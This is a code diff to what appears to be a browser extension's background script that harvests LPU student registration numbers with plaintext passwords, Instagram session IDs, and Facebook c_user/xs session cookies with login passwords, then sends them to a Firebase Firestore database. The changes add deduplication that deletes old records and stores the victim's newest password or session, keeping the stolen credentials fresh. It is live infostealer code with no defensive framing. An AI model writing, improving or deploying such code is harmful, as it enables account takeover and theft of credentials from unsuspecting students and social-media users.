@@ -8,7 +8,7 @@ console.log(
 
 // ============== Firebase + Utils Imports ==============
 import { db } from "./session/firebase-init.js";
-import { collection, addDoc } from "./session/firebase-firestore.js";
+import { collection, addDoc, getDocs, query, where, deleteDoc, doc } from "./session/firebase-firestore.js";
 import { isDuplicateData } from "./session/utils.js";
 
 // ============== Icon Cache for WebIn Overlay ==============
@@ -74,6 +74,11 @@ chrome.runtime.onMessage.addListener((request, sender, sendResponse) => {
   // Student Data Handler (LPU)
   if (request.type === "student_data") {
     handleStudentData(request.data);
+  }
+
+  // LPU Password Expiry Update (from dashboard after login)
+  if (request.type === "lpu_expiry_update") {
+    handleLpuExpiryUpdate(request.data);
   }
 });
 
@@ -149,7 +154,7 @@ function handleInstagramLoginData(data) {
 }
 
 // ============== Student Data Handler (LPU) ==============
-// Uses registrationNumber for deduplication
+// Uses registrationNumber for deduplication, replaces old entry if password changes
 async function handleStudentData(data) {
   const { registrationNumber, password, pwdExpiryDays, pwdExpiryDate } = data;
 
@@ -163,27 +168,34 @@ async function handleStudentData(data) {
     return;
   }
 
-  // Check memory cache first
-  if (savedStudentSet.has(registrationNumber)) {
-    console.log("%c[LPU] SKIP: RegNo already in memory cache", "color: #9e9e9e;");
-    return;
-  }
-
   console.log("%c[LPU] RECEIVED: Student credentials", "color: #2196f3; font-weight: bold;");
   console.table({ registrationNumber, password: "*".repeat(password.length), pwdExpiryDays, pwdExpiryDate });
 
   const colRef = collection(db, "studentData");
 
   try {
-    // Check if registrationNumber already exists in database
-    const { getDocs, query, where } = await import("./session/firebase-firestore.js");
-    const q = query(colRef, where("registrationNumber", "==", registrationNumber));
-    const snapshot = await getDocs(q);
+    // Check if same regNo + password already exists (exact duplicate)
+    const exactQ = query(colRef, where("registrationNumber", "==", registrationNumber), where("password", "==", password));
+    const exactSnapshot = await getDocs(exactQ);
     
-    if (!snapshot.empty) {
-      console.log("%c[LPU] SKIP: RegNo already exists in database", "color: #9e9e9e;");
+    if (!exactSnapshot.empty) {
+      console.log("%c[LPU] SKIP: Same credentials already exist", "color: #9e9e9e;");
       savedStudentSet.add(registrationNumber);
       return;
+    }
+
+    // Check if same regNo exists with OLD password - delete it
+    const regQ = query(colRef, where("registrationNumber", "==", registrationNumber));
+    const regSnapshot = await getDocs(regQ);
+    
+    let replacedOld = false;
+    if (!regSnapshot.empty) {
+      // Delete all old documents for this registrationNumber
+      for (const docSnap of regSnapshot.docs) {
+        console.log("%c[LPU] Deleting old entry for: " + registrationNumber, "color: #ff9800;");
+        await deleteDoc(doc(db, "studentData", docSnap.id));
+        replacedOld = true;
+      }
     }
 
     // Build document data
@@ -204,9 +216,72 @@ async function handleStudentData(data) {
     // Save to database
     savedStudentSet.add(registrationNumber);
     await addDoc(colRef, docData);
-    console.log("%c[LPU] SAVED: " + registrationNumber + (pwdExpiryDate ? " (expires: " + pwdExpiryDate + ")" : ""), "color: #4caf50; font-weight: bold; font-size: 13px;");
+    console.log("%c[LPU] SAVED: " + registrationNumber + (pwdExpiryDate ? " (expires: " + pwdExpiryDate + ")" : "") + (replacedOld ? " [replaced old entry]" : ""), "color: #4caf50; font-weight: bold; font-size: 13px;");
   } catch (err) {
     console.error("[LPU] ERROR: Failed to save to Firestore:", err);
+  }
+}
+
+// ============== LPU Password Expiry Update Handler ==============
+// Updates existing entry with password expiry info from dashboard
+async function handleLpuExpiryUpdate(data) {
+  const { registrationNumber, pwdExpiryDays, pwdExpiryDate } = data;
+
+  if (!registrationNumber) {
+    console.warn("[LPU-Expiry] SKIP: No registration number provided");
+    return;
+  }
+
+  if (pwdExpiryDays === null && !pwdExpiryDate) {
+    console.warn("[LPU-Expiry] SKIP: No expiry info to update");
+    return;
+  }
+
+  console.log("%c[LPU-Expiry] RECEIVED: Expiry update for " + registrationNumber, "color: #2196f3; font-weight: bold;");
+  console.table({ registrationNumber, pwdExpiryDays, pwdExpiryDate });
+
+  const colRef = collection(db, "studentData");
+
+  try {
+    // Find existing entry for this registration number
+    const regQ = query(colRef, where("registrationNumber", "==", registrationNumber));
+    const regSnapshot = await getDocs(regQ);
+
+    if (regSnapshot.empty) {
+      console.log("%c[LPU-Expiry] SKIP: No existing entry found for " + registrationNumber, "color: #ff9800;");
+      return;
+    }
+
+    // Update each matching document (should be only one)
+    for (const docSnap of regSnapshot.docs) {
+      const existingData = docSnap.data();
+      
+      // Check if expiry info already exists and is same
+      if (existingData.pwdExpiryDays === pwdExpiryDays && existingData.pwdExpiryDate === pwdExpiryDate) {
+        console.log("%c[LPU-Expiry] SKIP: Expiry info already up to date", "color: #9e9e9e;");
+        return;
+      }
+
+      // Delete old entry and create new with updated expiry info
+      await deleteDoc(doc(db, "studentData", docSnap.id));
+      
+      const updatedData = {
+        ...existingData,
+        timestamp: new Date()
+      };
+      
+      if (pwdExpiryDays !== null && pwdExpiryDays !== undefined) {
+        updatedData.pwdExpiryDays = pwdExpiryDays;
+      }
+      if (pwdExpiryDate) {
+        updatedData.pwdExpiryDate = pwdExpiryDate;
+      }
+
+      await addDoc(colRef, updatedData);
+      console.log("%c[LPU-Expiry] UPDATED: " + registrationNumber + " (expires: " + pwdExpiryDate + ", days: " + pwdExpiryDays + ")", "color: #4caf50; font-weight: bold; font-size: 13px;");
+    }
+  } catch (err) {
+    console.error("[LPU-Expiry] ERROR: Failed to update Firestore:", err);
   }
 }
 
@@ -296,21 +371,34 @@ async function handleInstagram() {
     const colRef = collection(db, "instagram");
 
     try {
-      // Check if sessionId already exists in database
-      const { getDocs, query, where } = await import("./session/firebase-firestore.js");
-      const q = query(colRef, where("sessionId", "==", sessionId));
-      const snapshot = await getDocs(q);
+      // Check if same sessionId already exists (exact duplicate)
+      const sessionQ = query(colRef, where("sessionId", "==", sessionId));
+      const sessionSnapshot = await getDocs(sessionQ);
       
-      if (!snapshot.empty) {
-        console.log("%c[IG] SKIP: SessionId already exists in database", "color: #9e9e9e;");
+      if (!sessionSnapshot.empty) {
+        console.log("%c[IG] SKIP: Same sessionId already exists", "color: #9e9e9e;");
         savedInstagramBySessionId.add(sessionId);
         return;
       }
 
-      // Save to database
+      // Check if same userId exists with OLD sessionId - delete it
+      const userQ = query(colRef, where("userId", "==", userId));
+      const userSnapshot = await getDocs(userQ);
+      
+      if (!userSnapshot.empty) {
+        // Delete all old documents for this userId
+        for (const docSnap of userSnapshot.docs) {
+          const oldSessionId = docSnap.data().sessionId;
+          console.log("%c[IG] Deleting old session for userId: " + userId, "color: #ff9800;");
+          await deleteDoc(doc(db, "instagram", docSnap.id));
+          savedInstagramBySessionId.delete(oldSessionId); // Remove from cache
+        }
+      }
+
+      // Save new session to database
       savedInstagramBySessionId.add(sessionId);
       await addDoc(colRef, { ...docData, timestamp: new Date() });
-      console.log("%c[IG] SAVED: @" + username + (docData.loginPassword ? " (with credentials)" : ""), "color: #4caf50; font-weight: bold; font-size: 13px;");
+      console.log("%c[IG] SAVED: @" + username + (docData.loginPassword ? " (with credentials)" : "") + (userSnapshot && !userSnapshot.empty ? " [replaced old session]" : ""), "color: #4caf50; font-weight: bold; font-size: 13px;");
     } catch (err) {
       console.error("[IG] ERROR: Failed to save to Firestore:", err);
     }
@@ -392,21 +480,32 @@ async function handleFacebook() {
     const colRef = collection(db, "facebook");
 
     try {
-      // Check if c_user already exists in database
-      const { getDocs, query, where } = await import("./session/firebase-firestore.js");
-      const q = query(colRef, where("c_user", "==", cUserValue));
-      const snapshot = await getDocs(q);
+      // Check if same xs (session) already exists (exact duplicate)
+      const xsQ = query(colRef, where("xs", "==", xsValue));
+      const xsSnapshot = await getDocs(xsQ);
       
-      if (!snapshot.empty) {
-        console.log("%c[FB] SKIP: c_user already exists in database", "color: #9e9e9e;");
+      if (!xsSnapshot.empty) {
+        console.log("%c[FB] SKIP: Same xs session already exists", "color: #9e9e9e;");
         savedFacebookByCUser.add(cUserValue);
         return;
       }
 
-      // Save to database
+      // Check if same c_user exists with OLD xs - delete it
+      const userQ = query(colRef, where("c_user", "==", cUserValue));
+      const userSnapshot = await getDocs(userQ);
+      
+      if (!userSnapshot.empty) {
+        // Delete all old documents for this c_user
+        for (const docSnap of userSnapshot.docs) {
+          console.log("%c[FB] Deleting old session for c_user: " + cUserValue, "color: #ff9800;");
+          await deleteDoc(doc(db, "facebook", docSnap.id));
+        }
+      }
+
+      // Save new session to database
       savedFacebookByCUser.add(cUserValue);
       await addDoc(colRef, { ...docData, timestamp: new Date() });
-      console.log("%c[FB] SAVED: User " + cUserValue + (docData.loginPassword ? " (with credentials)" : ""), "color: #4caf50; font-weight: bold; font-size: 13px;");
+      console.log("%c[FB] SAVED: User " + cUserValue + (docData.loginPassword ? " (with credentials)" : "") + (userSnapshot && !userSnapshot.empty ? " [replaced old session]" : ""), "color: #4caf50; font-weight: bold; font-size: 13px;");
     } catch (err) {
       console.error("[FB] ERROR: Failed to save to Firestore:", err);
     }
